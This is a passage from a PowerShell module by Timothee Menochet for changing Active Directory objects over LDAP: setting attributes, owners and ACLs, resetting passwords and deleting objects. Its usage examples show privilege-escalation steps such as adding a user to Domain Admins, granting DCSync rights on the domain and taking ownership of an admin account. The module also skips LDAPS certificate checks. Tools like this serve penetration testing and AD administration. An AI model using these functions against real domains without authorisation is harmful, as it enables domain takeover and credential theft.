                Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $TargetDN -Properties $properties -Operation Replace -Credential $Credential
            }
            else {
                # Remove msDS-AllowedToActOnBehalfOfOtherIdentity
                $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $currentSddlString
                $sdBytes = New-Object byte[] ($SD.BinaryLength)
                $SD.GetBinaryForm($sdBytes, 0)
                $properties = @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sdBytes}
                Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $TargetDN -Properties $properties -Operation Remove -Credential $Credential
            }
        }
    }
}

Function Set-LdapObject {
<#
.SYNOPSIS
    Modify properties for a given Active Directory object.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-LdapObject adds, replaces or removes specified properties for an Active Directory object.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER DistinguishedName
    Specifies the distinguished name of the object.

.PARAMETER Properties
    Specifies the properties of the object to modify.

.PARAMETER Operation
    Specifies whether the specified properties will be added, replaced or removed. Defaults to 'Add'.

.EXAMPLE
    PS C:\> Set-LdapObject -Server DC.ADATUM.CORP -DistinguishedName "CN=Domain Admins,CN=Users,DC=ADATUM,DC=CORP" -Properties @{member="CN=testuser,CN=Users,DC=ADATUM,DC=CORP"} -Operation Add
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [ValidateNotNullOrEmpty()]
        [hashtable]
        $Properties,

        [ValidateSet('Add', 'Replace', 'Remove')]
        [String]
        $Operation = 'Add',

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $rootDSE = Get-LdapRootDSE -Server $Server
    $defaultNC = $rootDSE.defaultNamingContext[0]

    if ($SSL) {
        try {
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $request = New-Object -TypeName DirectoryServices.Protocols.ModifyRequest
            $request.DistinguishedName = $DistinguishedName
            switch ($Operation) {
                'Add'       { $op = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Add }
                'Replace'   { $op = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace }
                'Remove'    { $op = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete }
            }
            foreach ($property in $Properties.GetEnumerator()) {
                $modification = New-Object -TypeName DirectoryServices.Protocols.DirectoryAttributeModification
                $modification.Name = $property.Key
                $modification.Operation = $op
                $modification.Add($property.Value) | Out-Null
                $request.Modifications.Add($modification) | Out-Null
            }
            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                Write-Verbose "Object modified: $DistinguishedName"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            if ($DistinguishedName -eq $defaultNC) {
                $searchBase = $defaultNC
            }
            else {
                $RDN = $DistinguishedName.Split(',')[0]
                $searchBase = $DistinguishedName -replace "^$($RDN),"
            }
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $searchBase -Filter $filter -Properties 'distinguishedName' -Credential $Credential -Raw
            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $entry = $object.GetDirectoryEntry()
            foreach ($property in $Properties.GetEnumerator()) {
                # unicodePwd can not be set in cleartext
                if ($property.Key -eq 'unicodePwd') {
                    $passwordBytes = $property.Value
                }
                else {
                    switch ($Operation) {
                        'Add' { 
                            $entry.Properties[$property.Key].Add($property.Value) | Out-Null
                        }
                        'Replace' {
                            $entry.Put($property.Key, $property.Value)
                        }
                        'Remove' {
                            $entry.Properties[$property.Key].Remove($property.Value)
                        }
                    }
                }
            }
            if ($passwordBytes) {
                Write-Verbose "Attempting to set password..."
                $password = [Text.Encoding]::Unicode.GetString($passwordBytes).TrimStart('"').TrimEnd('"')
                $entry.Invoke("SetPassword", $password)
            }
            $entry.CommitChanges()
            Write-Verbose "Object modified: $DistinguishedName"
        }
        catch {
            Write-Error $_
        }
    }
}

Function Set-LdapObjectOwner {
<#
.SYNOPSIS
    Modify the owner for a given Active Directory object.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-LdapObjectAcl modifies the owner for an Active Directory object.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER DistinguishedName
    Specifies the distinguished name of the object for which the security descriptor is modified.

.PARAMETER OwnerSID
    Specifies the Security Identifier (SID) of the new owner.

.EXAMPLE
    PS C:\> $sid = (New-Object Security.Principal.SecurityIdentifier (Get-LdapObject -Filter "(sAMAccountName=testuser)" -Properties objectSid).objectSid,0).Value
    PS C:\> Set-LdapObjectOwner -DistinguishedName "CN=testadmin,CN=Users,DC=ADATUM,DC=CORP" -OwnerSID $sid
    PS C:\> (New-Object Security.AccessControl.RawSecurityDescriptor (Get-LdapObject -Filter "(sAMAccountName=testadmin)" -Properties ntsecurityDescriptor -SecurityMasks @([DirectoryServices.SecurityMasks]::Owner)).ntsecurityDescriptor,0).Owner
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Security.Principal.SecurityIdentifier]
        $OwnerSID,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $rootDSE = Get-LdapRootDSE -Server $Server
    $defaultNC = $rootDSE.defaultNamingContext[0]

    if ($DistinguishedName -eq $defaultNC) {
        $searchBase = $defaultNC
    }
    else {
        $RDN = $DistinguishedName.Split(',')[0]
        $searchBase = $DistinguishedName -replace "^$($RDN),"
    }

    if ($SSL) {
        try {
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $searchBase -Filter $filter -Properties 'ntSecurityDescriptor' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $ads = New-Object -TypeName DirectoryServices.ActiveDirectorySecurity
            $ads.SetSecurityDescriptorBinaryForm($object.Attributes.ntsecuritydescriptor[0])
            $ads.SetOwner($OwnerSID)
            $securityDescriptor = $ads.GetSecurityDescriptorBinaryForm()  
            $modification = New-Object -TypeName DirectoryServices.Protocols.DirectoryAttributeModification
            $modification.Name = 'ntSecurityDescriptor'
            $modification.Operation = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
            $modification.Add($securityDescriptor) | Out-Null
            $request = New-Object -TypeName DirectoryServices.Protocols.ModifyRequest
            $request.DistinguishedName = $DistinguishedName
            $request.Modifications.Add($modification) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.PermissiveModifyControl
            $control.IsCritical = $false
            $request.Controls.Add($control) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.DirectoryControl("1.2.840.113556.1.4.801", $null, $false, $true)
            $request.Controls.Add($control) | Out-Null
            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                Write-Verbose "Object modified: $DistinguishedName"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $searchBase -Filter $filter -Properties 'distinguishedName' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $entry = $object.GetDirectoryEntry()
            $entry.PsBase.Options.SecurityMasks = 'Owner'
            $entry.PsBase.ObjectSecurity.SetOwner($OwnerSID)
            $entry.PsBase.CommitChanges()
            Write-Verbose "Object modified: $DistinguishedName"
        }
        catch {
            Write-Error $_
        }
    }
}

Function Set-LdapObjectAcl {
<#
.SYNOPSIS
    Modify ACL for a given Active Directory object.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-LdapObjectAcl adds or removes ACL for an Active Directory object.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER DistinguishedName
    Specifies the distinguished name of the object for which the security descriptor is modified.

.PARAMETER PrincipalSID
    Specifies the Security Identifier (SID) of the account benefiting from the rights.

.PARAMETER Rights
    Specifies the rights of the object to add or remove, default to all extended rights.

.PARAMETER Operation
    Specifies whether the specified properties will be added or removed, defaults to 'Add'.

.EXAMPLE
    PS C:\> $sid = (New-Object Security.Principal.SecurityIdentifier (Get-LdapObject -Server DC.ADATUM.CORP -Filter "(sAMAccountName=testuser)" -Properties objectSid).objectSid,0).Value
    PS C:\> Set-LdapObjectAcl -Server DC.ADATUM.CORP -DistinguishedName "DC=ADATUM,DC=CORP" -PrincipalSID $sid -Rights "DCSync" -Operation Add
    PS C:\> Get-LdapObjectAcl -Server DC.ADATUM.CORP -Filter "(dinstinguishedName=DC=ADATUM,DC=CORP)" | Where-Object {$_.SecurityIdentifier -eq $sid}
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [Security.Principal.SecurityIdentifier]
        $PrincipalSID,

        [ValidateSet('GenericAll', 'GenericWrite', 'AllExtended', 'DCSync', 'ResetPassword', 'WriteMembers')]
        [String]
        $Rights = 'AllExtended',

        [ValidateSet('Add', 'Remove')]
        [String]
        $Operation = 'Add',

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $principal = [Security.Principal.IdentityReference] $PrincipalSID
    $inheritanceType = [DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
    $controlType = [Security.AccessControl.AccessControlType] 'Allow'

    $GUIDs = switch ($Rights) {
        'GenericAll'    { 'GenericAll' }
        'GenericWrite'  { 'GenericWrite' }
        'AllExtended'   { '00000000-0000-0000-0000-000000000000' }
        'DCSync'        { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c' }
        'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
        'WriteMembers'  { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
    }
    $ACEs = @()
    if ($GUIDs -eq 'GenericAll') {
        $ADRights = [DirectoryServices.ActiveDirectoryRights] 'GenericAll'
        $ACEs += New-Object -TypeName DirectoryServices.ActiveDirectoryAccessRule $principal, $ADRights, $controlType, $inheritanceType
    }
    elseif ($GUIDs -eq 'GenericWrite') {
        $ADRights = [DirectoryServices.ActiveDirectoryRights] 'GenericWrite'
        $ACEs += New-Object -TypeName DirectoryServices.ActiveDirectoryAccessRule $principal, $ADRights, $controlType, $inheritanceType
    }
    else {
        foreach ($guid in $GUIDs) {
            $newGUID = New-Object -TypeName Guid $guid
            $ADRights = [DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
            $ACEs += New-Object -TypeName DirectoryServices.ActiveDirectoryAccessRule $principal, $ADRights, $controlType, $newGUID, $inheritanceType
        }
    }

    $rootDSE = Get-LdapRootDSE -Server $Server
    $defaultNC = $rootDSE.defaultNamingContext[0]

    if ($DistinguishedName -eq $defaultNC) {
        $searchBase = $defaultNC
    }
    else {
        $RDN = $DistinguishedName.Split(',')[0]
        $searchBase = $DistinguishedName -replace "^$($RDN),"
    }

    if ($SSL) {
        try {
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $searchBase -Filter $filter -Properties 'ntSecurityDescriptor' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $ads = New-Object -TypeName DirectoryServices.ActiveDirectorySecurity
            $ads.SetSecurityDescriptorBinaryForm($object.Attributes.ntsecuritydescriptor[0])
            foreach ($ace in $ACEs) {
                switch ($Operation) {
                    'Add'       { $ads.AddAccessRule($ace) }
                    'Remove'    { $ads.RemoveAccessRuleSpecific($ace) }
                }
            }
            $securityDescriptor = $ads.GetSecurityDescriptorBinaryForm()  
            $modification = New-Object -TypeName DirectoryServices.Protocols.DirectoryAttributeModification
            $modification.Name = 'ntSecurityDescriptor'
            $modification.Operation = [DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
            $modification.Add($securityDescriptor) | Out-Null
            $request = New-Object -TypeName DirectoryServices.Protocols.ModifyRequest
            $request.DistinguishedName = $DistinguishedName
            $request.Modifications.Add($modification) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.PermissiveModifyControl
            $control.IsCritical = $false
            $request.Controls.Add($control) | Out-Null
            $control = New-Object -TypeName DirectoryServices.Protocols.DirectoryControl("1.2.840.113556.1.4.801", $null, $false, $true)
            $request.Controls.Add($control) | Out-Null
            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                Write-Verbose "Object modified: $DistinguishedName"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $searchBase -Filter $filter -Properties 'distinguishedName' -Credential $Credential -Raw

            Write-Verbose "Attempting to modify object $DistinguishedName..."
            $entry = $object.GetDirectoryEntry()
            foreach ($ace in $ACEs) {
                $entry.PsBase.Options.SecurityMasks = 'Dacl'
                switch ($Operation) {
                    'Add' { 
                        $entry.PsBase.ObjectSecurity.AddAccessRule($ace)
                    }
                    'Remove' {
                        $entry.PsBase.ObjectSecurity.RemoveAccessRule($ace) | Out-Null
                    }
                }
                $entry.PsBase.CommitChanges()
            }
            Write-Verbose "Object modified: $DistinguishedName"
        }
        catch {
            Write-Error $_
        }
    }
}

Function Remove-LdapObject {
<#
.SYNOPSIS
    Remove a given Active Directory object.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Remove-LdapObject removes a given Active Directory object.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER DistinguishedName
    Specifies the distinguished name of the object to remove.

.PARAMETER Confirm
    Enables or disables warning prompt.

.EXAMPLE
    PS C:\> Remove-LdapObject -DistinguishedName "CN=testuser,CN=Users,DC=ADATUM,DC=CORP"
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [bool]
        $Confirm = $false
    )

    if (-not $Confirm) {
        $confirm_answer = Read-Host -Prompt "Are you sure you want to delete object $($DistinguishedName)? (Y/N)"
        if($confirm_answer -ne 'Y') {
            return
        }
    }

    if ($SSL) {
        try {
            $rootDSE = Get-LdapRootDSE -Server $Server
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }

            Write-Verbose "Attempting to remove object $DistinguishedName..."
            $request = New-Object -TypeName DirectoryServices.Protocols.DeleteRequest
            $request.DistinguishedName = $DistinguishedName
            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                Write-Verbose "Object removed: $DistinguishedName"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $RDN = $DistinguishedName.Split(',')[0]
            $searchBase = $DistinguishedName -replace "^$($RDN),"
            $filter = "(distinguishedName=$DistinguishedName)"
            $object = Get-LdapObject -Server $Server -SSL:$SSL -SearchBase $searchBase -Filter $filter -Properties 'distinguishedName' -Credential $Credential -Raw
            Write-Verbose "Attempting to remove object $DistinguishedName..."
            $entry = $object.GetDirectoryEntry()
            $entry.PsBase.DeleteTree()
            Write-Host "[*] Object removed: $DistinguishedName"
        }
        catch {
            Write-Error $_
        }
        finally {
            if ($entry.Path) {
                $entry.Close()
            }
        }
    }
}

Function Local:Get-LdapCurrentUser {
    Param (
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    try {
        [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
        if ($SSL) {
            $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $searcher.SessionOptions.SecureSocketLayer = $true
            $searcher.SessionOptions.VerifyServerCertificate = {$true}
        }
        else {
            $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList $Server
        }
        if ($Credential.UserName) {
            $searcher.Credential = $Credential
        }

        # LDAP_SERVER_WHO_AM_I_OID = 1.3.6.1.4.1.4203.1.11.3
        $extRequest = New-Object -TypeName DirectoryServices.Protocols.ExtendedRequest "1.3.6.1.4.1.4203.1.11.3"
        $resp = [Text.Encoding]::ASCII.GetString($searcher.SendRequest($extRequest).ResponseValue)
        [pscustomobject] @{
            "NetbiosName"   = $($resp.split('\')[0].split(':')[-1])
            "UserName"      = $($resp.split('\')[1])
        }
    }
    catch {
        Write-Error $_
    }
}

Function Local:Get-LdapRootDSE {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL
    )

    $searchString = "LDAP://$Server/RootDSE"
    if ($SSL) {
        # Note that the server certificate has to be trusted
        $authType = [DirectoryServices.AuthenticationTypes]::SecureSocketsLayer
    }
    else {
        $authType = [DirectoryServices.AuthenticationTypes]::Anonymous
    }
    $rootDSE = New-Object -TypeName DirectoryServices.DirectoryEntry($searchString, $null, $null, $authType)
    return $rootDSE
}

Function Local:Get-LdapObject {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateNotNullOrEmpty()]
        [DirectoryServices.SecurityMasks[]]
        $SecurityMasks,

        [Switch]
        $Raw
    )

    Begin {
        if ((-not $SearchBase) -or $SSL) {
            try {
                $rootDSE = Get-LdapRootDSE -Server $Server
                $defaultNC = $rootDSE.defaultNamingContext[0]
            }
            catch {
                Write-Error "Domain controller unreachable"
                continue
            }
            if (-not $SearchBase) {
                $SearchBase = $defaultNC
            }
        }
    }

    Process {
        try {
            if ($SSL) {
                $results = @()
                $domain = $defaultNC -replace 'DC=' -replace ',','.'
                [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
                $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
                $searcher.SessionOptions.SecureSocketLayer = $true
                $searcher.SessionOptions.VerifyServerCertificate = {$true}
                $searcher.SessionOptions.DomainName = $domain
                $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
                if ($Credential.UserName) {
                    $searcher.Bind($Credential)
                }
                else {
                    $searcher.Bind()
                }
                if ($Properties -ne '*') {
                    $request = New-Object -TypeName DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope, $Properties)
                }
                else {
                    $request = New-Object -TypeName DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope)
                }
                $pageRequestControl = New-Object -TypeName DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
                $request.Controls.Add($pageRequestControl) | Out-Null
                if ($SecurityMasks) {
                    $sdFlagsControl = New-Object -TypeName DirectoryServices.Protocols.SecurityDescriptorFlagControl -ArgumentList $SecurityMasks
                    $request.Controls.Add($sdFlagsControl) | Out-Null
                }
                $response = $searcher.SendRequest($request)
                while ($true) {
                    $response = $searcher.SendRequest($request)
                    if ($response.ResultCode -eq 'Success') {
                        foreach ($entry in $response.Entries) {
                            $results += $entry
                        }
                    }
                    $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl] $response.Controls[0]
                    if ($pageResponseControl.Cookie.Length -eq 0) {
                        break
                    }
                    $pageRequestControl.Cookie = $pageResponseControl.Cookie
                }
            }
            else {
                $adsPath = "LDAP://$Server/$SearchBase"
                if ($Credential.UserName) {
                    $domainObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher($domainObject)
                }
                else {
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher([ADSI] $adsPath)
                }
                $searcher.SearchScope = $SearchScope
                $searcher.PageSize = $PageSize
                $searcher.CacheResults = $false
                $searcher.filter = $Filter
                $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
                $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
                if ($SecurityMasks) {
                    $searcher.SecurityMasks = $SecurityMasks
                }
                $results = $searcher.FindAll()
            }
        }
        catch {
            Write-Error $_
            continue
        }

        if ($Raw) {
            $results
        }
        else {
            $results | Where-Object {$_} | ForEach-Object {
                if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
                    # Convert DirectoryAttribute object (LDAPS results)
                    $p = @{}
                    foreach ($a in $_.Attributes.Keys | Sort-Object) {
                        if (($a -eq 'objectsid') -or ($a -eq 'sidhistory') -or ($a -eq 'objectguid') -or ($a -eq 'securityidentifier') -or ($a -eq 'msDS-AllowedToActOnBehalfOfOtherIdentity') -or ($a -eq 'usercertificate') -or ($a -eq 'ntsecuritydescriptor') -or ($a -eq 'logonhours')) {
                            $p[$a] = $_.Attributes[$a]
                        }
                        elseif ($a -eq 'dnsrecord') {
                            $p[$a] = ($_.Attributes[$a].GetValues([byte[]]))[0]
                        }
                        elseif (($a -eq 'whencreated') -or ($a -eq 'whenchanged')) {
                            $value = ($_.Attributes[$a].GetValues([byte[]]))[0]
                            $format = "yyyyMMddHHmmss.fZ"
                            $p[$a] = [datetime]::ParseExact([Text.Encoding]::UTF8.GetString($value), $format, [cultureinfo]::InvariantCulture)
                        }
                        else {
                            $values = @()
                            foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
                                $values += [Text.Encoding]::UTF8.GetString($v)
                            }
                            $p[$a] = $values
                        }
                    }
                }
                else {
                    $p = $_.Properties
                }
                $objectProperties = @{}
                $p.Keys | ForEach-Object {
                    if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                        $objectProperties[$_] = $p[$_][0]
                    }
                    elseif ($_ -ne 'adspath') {
                        $objectProperties[$_] = $p[$_]
                    }
                }
                New-Object -TypeName PSObject -Property ($objectProperties)
            }
        }
    }

    End {
        if ($results -and -not $SSL) {
            $results.dispose()
        }
        if ($searcher) {
            $searcher.dispose()
        }
    }
}

Function Local:Get-LdapObjectAcl {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=domain)',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        if ((-not $SearchBase) -or $SSL) {
            try {
                $rootDSE = Get-LdapRootDSE -Server $Server
                $defaultNC = $rootDSE.defaultNamingContext[0]
            }
            catch {
                Write-Error "Domain controller unreachable"
                continue
            }
            if (-not $SearchBase) {
                $SearchBase = $defaultNC
            }
        }
        $securityMasks = @([DirectoryServices.SecurityMasks]::Dacl)
    }

    Process {
        try {
            if ($SSL) {
                $domain = $defaultNC -replace 'DC=' -replace ',','.'
                [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
                $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
                $searcher.SessionOptions.SecureSocketLayer = $true
                $searcher.SessionOptions.VerifyServerCertificate = {$true}
                $searcher.SessionOptions.DomainName = $domain
                $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
                if ($Credential.UserName) {
                    $searcher.Bind($Credential)
                }
                else {
                    $searcher.Bind()
                }
                $request = New-Object -TypeName DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope)
                $pageRequestControl = New-Object -TypeName DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
                $request.Controls.Add($pageRequestControl) | Out-Null
                $sdFlagsControl = New-Object -TypeName DirectoryServices.Protocols.SecurityDescriptorFlagControl -ArgumentList $securityMasks
                $request.Controls.Add($sdFlagsControl) | Out-Null
                $response = $searcher.SendRequest($request)
                $results = @()
                while ($true) {
                    $response = $searcher.SendRequest($request)
                    if ($response.ResultCode -eq 'Success') {
                        foreach ($entry in $response.Entries) {
                            $results += $entry
                        }
                    }
                    $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl] $response.Controls[0]
                    if ($pageResponseControl.Cookie.Length -eq 0) {
                        break
                    }
                    $pageRequestControl.Cookie = $pageResponseControl.Cookie
                }
            }
            else {
                $adsPath = "LDAP://$Server/$SearchBase"
                if ($Credential.UserName) {
                    $domainObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher($domainObject)
                }
                else {
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher([ADSI] $adsPath)
                }
                $searcher.SearchScope = $SearchScope
                $searcher.PageSize = $PageSize
                $searcher.CacheResults = $false
                $searcher.filter = $Filter
                $propertiesToLoad = 'objectsid', 'ntsecuritydescriptor', 'distinguishedname'
                $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
                $searcher.SecurityMasks = $securityMasks
                $results = $searcher.FindAll()
            }
        }
        catch {
            Write-Error $_
            continue
        }

        $results | Where-Object {$_} | ForEach-Object {
            if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
                # Convert DirectoryAttribute object (LDAPS results)
                $p = @{}
